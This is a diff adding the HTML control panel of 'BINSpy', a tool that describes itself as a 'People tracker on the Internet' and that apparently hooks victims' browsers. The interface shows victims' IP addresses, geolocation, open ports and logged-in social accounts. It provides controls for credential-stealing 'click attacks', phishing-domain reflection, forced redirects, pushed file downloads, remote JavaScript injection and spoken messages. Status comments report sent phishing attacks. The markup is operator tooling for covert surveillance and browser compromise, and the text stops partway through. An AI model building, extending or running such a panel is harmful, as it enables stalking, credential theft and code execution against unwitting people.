@@ -1,0 +1,499 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>BINSpy : Control Panel</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
+    <meta name="apple-mobile-web-app-title" content="BINSpy">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="robots" content="noindex, nofollow"/>
+    <meta name="theme-color" content="#000" />
+    <meta name="google" value="notranslate"/>
+    <meta name="author" content="ALIF XAVIER LEOPARTA, @ALIF101XL"/>
+    <meta name="description" content="OSINT Research and analytics tool"/>
+    <!-- Styles & Favicon -->
+    <link rel="shortcut icon" type="image/x-icon" href="../static/img/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="../static/img/logo.png">
+    <link rel="stylesheet" href="../static/css/base-icons.css">
+    <link rel="stylesheet" href="../static/css/normalize.min.css">
+    <link rel="stylesheet" href="../static/css/services-icons.css">
+    <link rel="stylesheet" href="../static/css/style.css">
+
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script>
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
+
+  </head>
+  <body class="BINSpyBody-Control">
+    <div class="BINSpyControl-Header">
+      <div class="BINSpyControl-Header--logo">
+        <div class="BINSpyControl-Header--logo---Box">
+          <span class="BINSpyControl-Header--logo---letter">BIN</span>
+        </div>
+        <a href="/" class="BINSpyControl-Header--logoText">BINSpy
+          <div class="BINSpyControl-Header--Version">
+            <span class="BINSpyControl-Header--Version---name">stable</span>
+            <span class="BINSpyControl-Header--Version---number">v2.0</span>
+          </div>
+          <span class="BINSpyControl-Header--logo---description">People tracker on the Internet</span>
+        </a>
+      </div>
+      <div class="BINSpyControl-Header--menu">
+        <a class="BINSpyControl-Header--menu---btnLogout" href="/logout">
+          <div class="BINSpyControl-Header--menu---btnLogout----Icon icon-sign-out"></div>
+          <div class="BINSpyControl-Header--menu---btnLogout----Text">Logout</div>
+        </a>
+      </div>
+    </div>
+    <div class="BINSpyControl-Wrapper">
+      <div class="BINSpyControl-Wrapper--PrincipalData">
+        <div class="BINSpyControl-Wrapper--PrincipalData---Info">
+          <div class="BINSpyControl-Wrapper--PrincipalData---InfoDetails">
+            <h2><span class="BINSpyControl-Wrapper--PrincipalData---InfoDetails----Icons icon-text-document"></span> <span id="lblBINSpy_DomainTitle"></span></h2>
+            <span class="BINSpyControl-Wrapper--PrincipalData---InfoDetails---domainClone"><span class="BINSpyControl-Wrapper--PrincipalData---InfoDetails----Icons icon-globe"></span> Cloned link: <a target="_blank" href="#" id="lnkBINSpyControl_DomainClone"></a></span>
+            <span class="BINSpyControl-Wrapper--PrincipalData---InfoDetails---injectCode"><span class="BINSpyControl-Wrapper--PrincipalData---InfoDetails----Icons icon-code2"></span> REST API (Inject code): <a id="lnkBINSpyControl_InjectCode" target="_blank" href=""></a>
+          </span>
+          <span class="BINSpyControl-Wrapper--PrincipalData---InfoDetails---start"><span class="BINSpyControl-Wrapper--PrincipalData---InfoDetails----Icons icon-clock-o"></span> Starting on <span id="lblBINSpyControl_StartDate">{start date}</span></span>
+          <div class="BINSpyControl-Wrapper--PrincipalData---InfoDetails----zoneCopy">
+            <a class="BINSpyControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----url" id="lnkBINSpyControl_url" target='_blank' href="http://localhost">http://localhost</a>
+            <button class="BINSpyControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----button" title="Copy" onclick="copyUrl('#lnkBINSpyControl_url')"><span class="icon-clipboard2"></span></button>
+            <button class="BINSpyControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----buttonShare" title="Sharing in networks" data-action="toggle"><span class="icon-share"></span></button>
+            <ul class="BINSpyControl-shareBox">
+              <li class="BINSpyControl-shareBox--Item---triangleDown"></li>
+              <li class="BINSpyControl-shareBox--Item---list">
+                <a target="_self" id="lnkBINSpy_ShareTwitter" href="https://x.com/"><span class="BINSpyControl-shareBox--socialTwitter"><i class="icon-twitter"></i></span> Twitter <span class="BINSpyControl-shareBox--pointRight"></span></a>
+              </li>
+              <li class="BINSpyControl-shareBox--Item---list">
+                <a target="_self" id="lnkBINSpy_ShareFacebook" href="https://facebook.com/"><span class="BINSpyControl-shareBox--socialFacebook"><i class="icon-facebook"></i></span> Facebook <span class="BINSpyControl-shareBox--pointRight"></span></a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <!-- </info -->
+    </div>
+   
+    <!-- details -->
+    <div class="BINSpyControl-ViewDetails">
+      <div class="BINSpyControl-Preview">
+        <div class="BINSpyControl-Preview--box">
+          <div class="BINSpyControl-Preview--buttonClose"><i class="icon-times"></i></div>
+          <div class="BINSpyControl-Preview--box---Sidebar">
+            <div class="BINSpyControl-Preview--box---Sidebar----title">
+              
+              <div class="BINSpyControl-Preview--box---Sidebar----Iconbox">
+                <span class="BINSpyControl-Preview--box---Sidebar----Iconbox-----define">
+                  <span class="icon-user2"></span>
+                </span>
+                <span class="BINSpyControl-Preview--box---Sidebar----Iconbox-----text">Profile</span>
+              </div>
+              <div class="BINSpyControl-Preview--box---Sidebar----Tabs">
+                <button data-action="summary" class="BINSpyControl-Preview--box---Sidebar----Tabs-----button is-active">Summary</button>
+                <button data-action="sessions" class="BINSpyControl-Preview--box---Sidebar----Tabs-----button">Sessions</button>
+              </div>
+            </div>
+            <!-- home(BINSpyControl-PreviewProfileWhoIsItBox) -->
+            <div class="BINSpyControl-WhoSe BINSpyControl-PreviewProfileWhoIsItBox" data-action="summary">
+              <div class="BINSpyControl-PreviewProfileWhoIsItBox--info">
+                <div class="BINSpyControl-PreviewSummary--info---NavigationMode">
+                  <span class="BINSpyControl-PreviewSummary--info---NavigationMode----Icon"><i class="icon-user-secret"></i></span>
+                  <span class="BINSpyControl-PreviewSummary--info---NavigationMode----text">Navigation mode: <strong class="BINSpyControl-PreviewSummary--info---NavigationMode----IncognitoTrue" id="lblBINSpyControl_NavigationMode_Incognito"></strong></span>
+                </div>
+                <div class="BINSpyControl-PreviewSummary--info---NavigationMode">
+                  <span class="BINSpyControl-PreviewSummary--info---NavigationMode----Icon"><i class="icon-browser"></i></span>
+                  <span class="BINSpyControl-PreviewSummary--info---NavigationMode----text">do not track: <strong class="BINSpyControl-PreviewSummary--info---NavigationMode----DNTTrue" id="lblBINSpyControl_NavigationMode_DoNotTrack"></strong></span>
+                </div>
+                <div class="BINSpyControl-PreviewSummary--info---NavigationMode">
+                  <span class="BINSpyControl-PreviewSummary--info---NavigationMode----Icon"><i class="icon-clock-o"></i></span>
+                  <span class="BINSpyControl-PreviewSummary--info---NavigationMode----text" id="lblBINSpyControl_NavigationMode_Status"></span>
+                </div>
+                <!--     <span class="BINSpyControl-PreviewProfileWhoIsItBox--info---ConnectionStatus"><i class="icon-clock-o"></i> Disconnected 3 minutes ago</span> -->
+                <div class="BINSpyControl-PreviewSummary--info---Sidebar">
+                  <div class="BINSpyControl-PreviewSummary--info---Sidebar----title">
+                    <h2>GPU</h2>
+                  </div>
+                  <div class="BINSpyControl-PreviewSummary--info---Data"><strong>Vendor:</strong> <span id="lblBINSpyControl_GPU_Vendor"></span></div>
+                  <div class="BINSpyControl-PreviewSummary--info---Data"><strong>Renderer:</strong> <span id="lblBINSpyControl_GPU_Renderer"> </span></div>
+                  <div class="BINSpyControl-PreviewSummary--info---Data"><strong>Display:</strong> <span id="lblBINSpyControl_GPU_Display"></span></div>
+                </div>
+                <div class="BINSpyControl-PreviewSummary--info---Sidebar">
+                  <div class="BINSpyControl-PreviewSummary--info---Sidebar----title">
+                    <h2>Energy</h2>
+                  </div>
+                  <div class="BINSpyControl-PreviewSummary--info---Data"><strong>Power Source:</strong> <span id="lblBINSpyControl_Batery_Source">Battery</span></div>
+                  <div class="BINSpyControl-PreviewSummary--info---Data"><strong>Level percentage:</strong> <span id="lblBINSpyControl_Batery_Level">0</span>%</div>
+                  <div class="BINSpyControl-PreviewSummary--info---Data"><strong>Remaining time:</strong> <span id="lblBINSpyControl_Batery_Time"></span></div>
+                </div>
+                <span class="BINSpyControl-PreviewProfileWhoIsItBox--info---TypeVictim"><span id="lblBINSpyControl-PreviewProfileWhoIsItBox--info---TypeVictim"></span><strong class="BINSpyControl-PreviewProfileWhoIsItBox--info---TypeVictim----Behavior" id="lblBINSpyControl_Preview_Behavior"></strong></span>
+              </div>
+            </div>
+            <div class="BINSpyControl-WhoSe BINSpyControl-Preview--box---Sidebar----Networks" data-action="sessions">
+              <h2 class="BINSpyControl-Preview--box---Sidebar----NetworksStatusSessions">Session states: <span class="BINSpyControl-Preview--box---Sidebar----NetworksStatusSessions-----totalOnline">0</span><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatusSessions-----separator"></span><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatusSessions-----totalOffline">0</span>
+              </h2>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine facebook" title="Facebook (facebook.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus online"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine messenger" title="Messenger (messenger.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine instagram" title="Instagram (instagram.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine snapchat" title="Snapchat (snapchat.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine twitter" title="Twitter (twitter.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine vkontakte" title="Vkontakte (vk.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine reddit" title="Reddit (reddit.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine gmail" title="Google (Gmail)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine youtube" title="Youtube (youtube.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine tumblr" title="Tumblr (tumblr.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine medium" title="Medium (medium.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine github" title="Github (github.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus online"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine bitbucket" title="Bitbucket (bitbucket.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus online"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine dropbox" title="Dropbox (dropbox.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus online"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine spotify" title="Spotify (spotify.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus online"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine paypal" title="PayPal (paypal.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine amazon" title="Amazon (amazon.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine etsy" title="Etsy (etsy.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine foursquare" title="Foursquare (foursquare.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine airbnb" title="Airbnb (airbnb.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine hackernews" title="Hackernews (news.ycombinator.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine slack" title="Slack (slack.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine disqus" title="Disqus (disqus.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine eventbrite" title="Eventbrite (eventbrite.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine meetup" title="Meetup (meetup.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine patreon" title="Patreon (patreon.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine square" title="Square (squareup.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine udemy" title="Udemy (udemy.com)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine khanacademy" title="khanacademy (khanacademy.org)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <div class="BINSpyControl-Preview--box---Sidebar----NetworksDefine twitch" title="twitch (twitch.tv)"><span class="BINSpyControl-Preview--box---Sidebar----NetworksStatus offline"></span></div>
+              <!--<div class="BINSpyControl-Preview--box---Sidebar----NetworksBehavior"><i class="icon-user2"></i> behavior: <span id="lblBINSpyControl_Preview_Behavior"></span></div> -->
+              <div class="BINSpyControl-Preview--box---Sidebar---PlayAttackServices">
+                <div class="BINSpyControl-Preview--box---Sidebar----titlePlayAttack">
+                  <h2>Click Attack to get credentials</h2>
+                </div>
+                <div class="BINSpyControl-Preview--box---Sidebar----selectPlayAttack">
+                  <span class="BINSpyControl-Preview--box---Sidebar----selectPlayAttack-----icon"></span>
+                  <select name="serviceNetwork" id="txtBINSpyControl_SelectPlayAttack">
+                    <option value="">Choose an active service</option>
+                  </select>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!-- end(BINSpyControl-Preview--box---Sidebar----Networks) -->
+          <div class="BINSpyControl-Preview--box---Mapbox">
+            <form class="BINSpyControl-Preview--box---Mapbox----putNameLog" action="?" method="post">
+              <input type="text" autocomplete="on" class="BINSpyControl-Preview--box---Mapbox----putNameLog-----input" placeholder="Put a name or text to this log" name="text">
+              <button class="BINSpyControl-Preview--box---Mapbox----putNameLog-----button" type="submit"><span class="icon-check"></span></button>
+            </form>
+            <div class="BINSpyControl-Preview--box---MapboxDataIPs">
+              <span class="BINSpyControl-Preview--box---MapboxDataIPs----iconBox">
+                <span class="icon-server"></span>
+              </span>
+              <span class="BINSpyControl-Preview--box---MapboxDataIPs----text">Public IP: <a class="BINSpyControl-Preview--box---MapboxDataIPs----link" href="#" id="lnkBINSpyControlPreview_PublicIP"></a></span>
+              <div class="BINSpyControl-Preview--box---MapboxDataIPs----line"></div>
+              <span class="BINSpyControl-Preview--box---MapboxDataIPs----text">Local IP: <span class="BINSpyControl-Preview--box---MapboxDataIPs----textLocal" id="lnkBINSpyControlPreview_LocalIP"></span>
+            </span>
+          </div>
+          <div class="BINSpyControl-Preview--box---Distance">
+            <span class="BINSpyControl-Preview--box---Distance----iconBox">
+              <span class="icon-road"></span>
+            </span>
+            <span class="BINSpyControl-Preview--box---Distance----text">Distance now: <span id="txtBINSpyControl_Distance" class="BINSpyControl-Preview--box---Distance----NowTarget">loading...</span></span>
+          </span>
+          <div class="BINSpyControl-Preview--box---Distance----line"></div>
+          <span class="BINSpyControl-Preview--box---Distance----text">Total distance: <span class="BINSpyControl-Preview--box---Distance----subText">loading...</span></span>
+        </span>
+        <div class="BINSpyControl-Preview--box---Distance----line"></div>
+        <span class="BINSpyControl-Preview--box---Distance----text">Estimated time: <span class="BINSpyControl-Preview--box---Distance----subTextTime">loading...</span></span>
+      </div>
+      <div class="BINSpyControl-Preview--box---SummaryLocation">
+        <span class="BINSpyControl-Preview--box---SummaryLocation----iconBox">
+          <span class="icon-map"></span>
+        </span>
+        <span class="BINSpyControl-Preview--box---SummaryLocation----text">Postal code: <span class="BINSpyControl-Preview--box---SummaryLocation----subText" id="mapPostalCode">loading...</span></span>
+        <div class="BINSpyControl-Preview--box---SummaryLocation----line"></div>
+        <span class="BINSpyControl-Preview--box---MapboxDataIPs----text">Address: <span class="BINSpyControl-Preview--box---SummaryLocation----subText" id="lblBINSpyContol_Address">loading...</span>
+      </span>
+    </div>
+    <div id="cntBINSpyControlPreview_Map" class="BINSpyControl-Preview--box---Mapbox----define"></div>
+    <!-- notification action/status -->
+    <!-- HIDE: BINSpyControl-Preview--NotificationHide -->
+    <div class="BINSpyControl-Preview--NotificationAlert">
+      <div class="BINSpyControl-Preview--NotificationAlert---define BINSpyControl-Preview--NotificationAlert---offline">
+        <div class="BINSpyControl-Preview--NotificationAlert---define----Icon">
+          <i class="icon-close"></i>
+        </div>
+        <div class="BINSpyControl-Preview--NotificationAlert---define----Content">
+          <p>Actions cannot be executed because the user is <strong>offline</strong></p>
+        </div>
+      </div>
+      <div class="BINSpyControl-Preview--NotificationAlert---define BINSpyControl-Preview--NotificationAlert---online">
+        <div class="BINSpyControl-Preview--NotificationAlert---define----Icon">
+          <i class="icon-check"></i>
+        </div>
+        <div class="BINSpyControl-Preview--NotificationAlert---define----Content">
+          <p>The user has been <strong>connected</strong> again. Execute actions!</p>
+        </div>
+      </div>
+      <div class="BINSpyControl-Preview--NotificationAlert---define BINSpyControl-Preview--NotificationAlert---success">
+        <div class="BINSpyControl-Preview--NotificationAlert---define----Icon">
+          <i class="icon-bolt"></i>
+        </div>
+        <div class="BINSpyControl-Preview--NotificationAlert---define----Content">
+          <p>Has processed a successful <strong>process hook</strong></p>
+        </div>
+      </div>
+    </div>
+    <!-- notification end -->
+  </div>
+</div>
+<!-- HOOKS -->
+<!-- You've processed a successful </strong>alert</strong> dispatch -->
+<!-- You've processed successful <strong>code</strong> sending -->
+<!-- The <strong>URL JavaScript</strong> is saved successfully -->
+<!-- Successfully processed <strong>redirect</strong> -->
+<!-- The <strong>phishing attack</strong> has been sent -->
+<!-- <strong>Download file</strong> has been successfully sent -->
+<!-- The <strong>audio message</strong> has been delivered -->
+<!-- <strong>Click attack</strong> has been processed -->
+<div class="BINSpyControl-Preview--box">
+  <div class="BINSpyControl-Preview--box---Details">
+    <div class="BINSpyControl-Preview--box---DetailsLine">
+      <span class="BINSpyControl-Preview--box---DetailsLine----define"></span>
+      <div class="BINSpyControl-Preview--box---DetailsElement----Iconbox">
+        <span class="BINSpyControl-Preview--box---DetailsElement----Iconbox-----define">
+          <span class="icon-bars"></span>
+        </span>
+        <span class="BINSpyControl-Preview--box---DetailsElement----text">Options</span>
+      </div>
+      <!-- tabs -->
+      <div class="BINSpyControl-Preview--Tabs">
+        <button data-action="information" class="BINSpyControl-Preview--Tabs---button is-active" >Information</button>
+        <button data-action="network" class="BINSpyControl-Preview--Tabs---button">Network status</button>
+        <button data-action="processHooks" class="BINSpyControl-Preview--Tabs---button">Process hook</button>
+      </div>
+    </div>
+  </div>
+  <div class="BINSpyControl-BoxTab" data-action="information">
+    <div class="BINSpyControl-Preview--dataShow">
+      <ul>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>CPU:</strong> <span id="lblBINSpyControl_Preview_CPU">_</span></div>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>Operating System:</strong> <span id="lblBINSpyControl_Preview_SO"></span></div>
+        <div class="BINSpyControl-Preview--dataShow---define" title=""><strong>User agent:</strong> <span id="lblBINSpyControl_Preview_UA">_</span></div>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>Browser:</strong> <span id="lblBINSpyControl_Preview_Browser"></span> <span id="lblBINSpyControl_Preview_BrowserVersion"></span></div>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>Open Ports:</strong> <span id="lblBINSpyControl_Preview_OpenPorts">_</span></div>
+        <!-- <div class="BINSpyControl-Preview--dataShow---define"><strong>Connection:</strong> <span id="lblBINSpyControl_Preview_Connection"></span></div> -->
+      </ul>
+    </div>
+    <div class="BINSpyControl-Preview--dataShow">
+      <ul>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>ISP Name:</strong> <span id="lblBINSpyControl_Preview_ISP">_</span></div>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>Country:</strong> <span id="lblBINSpyControl_Preview_Country"></span></div>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>City:</strong> <span id="lblBINSpyControl_Preview_City"></span></div>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>Latitude:</strong> <span id="lblBINSpyControl_Preview_Latitude"></span></div>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong>Longitude:</strong> <span id="lblBINSpyControl_Preview_Longitude"></span></div>
+        <div class="BINSpyControl-Preview--dataShow---define"><strong></strong> <span></span></div>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="BINSpyControl-BoxTab" data-action="processHooks">
+  <!-- hooks options -->
+  <div class="BINSpyControl-BoxTab--options">
+    <h2 class="BINSpyControl-BoxTab--options---Text">Controls in the browser of the user</h2>
+    <div class="BINSpyControl-BoxTab--options---Tabs">
+      <button data-action="Hseveral" class="BINSpyControl-BoxTab--options---Tabs----button is-active">Several</button>
+      <button data-action="Hinjecjs" class="BINSpyControl-BoxTab--options---Tabs----button">Inject JS</button>
+      <button data-action="Hspeech" class="BINSpyControl-BoxTab--options---Tabs----button">Speech</button>
+    </div>
+  </div>
+  <!-- end hooks options -->
+  <div class="BINSpyControl-Preview--SubTabsShow" data-action="Hseveral">
+    <div class="BINSpyControl-Preview--dataShow">
+      <form class="BINSpyControl-BoxTab--Form" action="?" method="post">
+        <input type="url" id="txtBINSpyControl-BoxTab-Phishing" autocomplete="on" class="BINSpyControl-BoxTab--Form---input" placeholder="Insert domain for phishing" name="phishing" required="true">
+        <button id="btnBINSpyControl-BoxTab-Phishing" class="BINSpyControl-BoxTab--Form---button" type="button">reflect <span class="icon-angle-right"></span></button>
+      </form>
+      <form class="BINSpyControl-BoxTab--Form" action="?" method="post">
+        <input type="url" id="txtBINSpyControl-BoxTab-Redirect" autocomplete="on" class="BINSpyControl-BoxTab--Form---input" placeholder="Insert link to redirect" name="redirect" required="true">
+        <button id="btnBINSpyControl-BoxTab-Redirect" class="BINSpyControl-BoxTab--Form---button" type="button">redirect <span class="icon-angle-right"></span></button>
+      </form>
+    </div>
+    <div class="BINSpyControl-Preview--dataShow">
+      <form class="BINSpyControl-BoxTab--FormRight" action="?" method="post">
+        <input id="txtBINSpyControl-BoxTab-Alert" type="text" autocomplete="on" class="BINSpyControl-BoxTab--Form---input" placeholder="Create alert for user" name="alert" required="true">
+        <button id="btnBINSpyControl-BoxTab-Alert" class="BINSpyControl-BoxTab--Form---button" type="button">execute <span class="icon-angle-right"></span></button>
+      </form>
+      <form class="BINSpyControl-BoxTab--FormRight" action="?" method="post">
+        <input id="txtBINSpyControl-BoxTab-Execute" type="text" autocomplete="on" class="BINSpyControl-BoxTab--Form---input" placeholder="Enter a file to download" name="download" required="true">
+        <button id="btnBINSpyControl-BoxTab-Execute" class="BINSpyControl-BoxTab--Form---button" type="button">Send <span class="icon-angle-right"></span></button>
+      </form>
+    </div>
+  </div>
+  <div class="BINSpyControl-Preview--SubTabsShow" data-action="Hinjecjs">
+    <div class="BINSpyControl-Preview--dataShow">
+      <form class="BINSpyControl-BoxTab--FormLeftDown" action="?" method="post">
+        <input type="url" autocomplete="off" class="BINSpyControl-BoxTab--Form---input" placeholder="Insert JavaScript code URL" name="urlJS" id="txtBINSpyControl_InjectCode" required="true">
+        <button class="BINSpyControl-BoxTab--Form---button" type="button" id="txtBINSpyControl_InjectCode">save</button>
+      </form>
+    </div>
+    <div class="BINSpyControl-Preview--dataShow">
+      <div class="BINSpyControl-BoxTab--FormRight" action="?" method="post">
+        <textarea type="text" autocomplete="on" class="BINSpyControl-BoxTab--Form---textarea" placeholder="Write JavaScript code" name="codeJS" required="true" id="txtBINSpyControl_RunCode"></textarea>
+        <button class="BINSpyControl-BoxTab--Form---button" type="button" id="btnBINSpyControl_RunCode">run code <span class="icon-angle-right"></span></button>
+      </div>
+    </div>
+  </div>
+  <div class="BINSpyControl-Preview--SubTabsShow" data-action="Hspeech">
+    <form class="BINSpyControl-BoxTab--FormSpeech" action="?" method="post">
+      <textarea name="speech" id="txtBINSpyControl_BoxTab_Speech" class="BINSpyControl-BoxTab--Form---textareaSpeech" placeholder="Write the words you want to play by voice..."></textarea>
+      <div class="BINSpyControl-BoxTab--Form---buttonsVoice">
+        <button class="BINSpyControl-BoxTab--Form---buttonsVoice----btn" type="button" data-vt="0"><span class="icon-sound"></span> English Female <span class="icon-angle-right"></span></button>
+        <button class="BINSpyControl-BoxTab--Form---buttonsVoice----btn" type="button" data-vt="1"><span class="icon-sound"></span> Spanish Female <span class="icon-angle-right"></span></button>
+        <button class="BINSpyControl-BoxTab--Form---buttonsVoice----btn" type="button" data-vt="2"><span class="icon-sound"></span> English Male <span class="icon-angle-right"></span></button>
+        <button class="BINSpyControl-BoxTab--Form---buttonsVoice----btn" type="button" data-vt="3"><span class="icon-sound"></span> Spanish Male <span class="icon-angle-right"></span></button>
+      </div>
+    </form>
+  </div>
+</div>
+<div class="BINSpyControl-BoxTab" data-action="network">
+  <div class="BINSpyControl-BoxTab--options">
+    <h2 class="BINSpyControl-BoxTab--options---Text">Information on network connections</h2>
+    <div class="BINSpyControl-BoxTab--options---subTabs">
+      <button data-action="dataSpeed" class="BINSpyControl-BoxTab--options---subTabs----button is-active">Speed</button>
+      <button data-action="dataHosts" class="BINSpyControl-BoxTab--options---subTabs----button">Hosts</button>
+    </div>
+  </div>
+  <div class="BINSpyControl-Preview--SubTabsNH" data-action="dataSpeed">
+    <div class="BINSpyControl-Preview--dataNetwork">
+      <div class="BINSpyControl-Preview--dataNetwork---Item">
+        <h2 class="BINSpyControl-Preview--dataNetwork---Item----text"><span class="BINSpyControl-Preview--dataNetwork---Item----iconPing"></span> Ping</h2>
+        <span id="lblBINSpyControl_dataNetwork_Ping" class="BINSpyControl-Preview--dataNetwork---Item----result">0</span>
+      </div>
+      <div class="BINSpyControl-Preview--dataNetwork---lineSeparation"></div>
+      <div class="BINSpyControl-Preview--dataNetwork---Item">
+        <h2 class="BINSpyControl-Preview--dataNetwork---Item----text"><span class="BINSpyControl-Preview--dataNetwork---Item----iconDownloadSpeed"></span> Download speed</h2>
+        <span id="lblBINSpyControl_dataNetwork_Download" class="BINSpyControl-Preview--dataNetwork---Item----result">0</span>
+      </div>
+      <div class="BINSpyControl-Preview--dataNetwork---lineSeparation"></div>
+      <div class="BINSpyControl-Preview--dataNetwork---Item">
+        <h2 class="BINSpyControl-Preview--dataNetwork---Item----text"><span class="BINSpyControl-Preview--dataNetwork---Item----iconUploadSpeed"></span> Upload speed</h2>
+        <span id="lblBINSpyControl_dataNetwork_Upload" class="BINSpyControl-Preview--dataNetwork---Item----result">0</span>
+      </div>
+      
+      <div class="BINSpyControl-Preview--dataNetwork---lineSeparation"></div>
+      <div class="BINSpyControl-Preview--dataNetwork---Item">
+        <h2 class="BINSpyControl-Preview--dataNetwork---Item----text"><span class="BINSpyControl-Preview--dataNetwork---Item----iconTypeNetwork"></span> Type connection</h2>
+        <span id="lblBINSpyControl_dataNetwork_Type" class="BINSpyControl-Preview--dataNetwork---Item----result">loading...</span>
+      </div>
+    </div>
+  </div>
+  <div class="BINSpyControl-Preview--SubTabsNH" data-action="dataHosts">
+    <div class="BINSpyControl-Preview--dataHostsPositionGeneral">
+      <div class="BINSpyControl-Preview--dataHostsElement---Item">
+        <h2 class="BINSpyControl-Preview--dataHostsElement---Item----text"><span class="BINSpyControl-Preview--dataHostsElement---Item----icon"></span> Total hosts</h2>
+        <span class="BINSpyControl-Preview--dataHostsElement---Item----result">8 found</span>
+      </div>
+      <div class="BINSpyControl-Preview--dataHostsElement---lineSeparation"></div>
+      <div class="BINSpyControl-Preview--dataHosts">
+        <div class="BINSpyControl-Preview--dataHosts---host">
+          <span class="BINSpyControl-Preview--dataHosts---host----iconBox">
+            1
+          </span>
+          <span class="BINSpyControl-Preview--dataHosts---host----text">host: <span class="BINSpyControl-Preview--dataHosts---host----subText">192.168.0.1</span></span>
+          <div class="BINSpyControl-Preview--dataHosts---host----line"></div>
+          <span class="BINSpyControl-Preview--dataHosts---host----text">time: <span class="BINSpyControl-Preview--dataHosts---host----subText">1.19 ms</span>
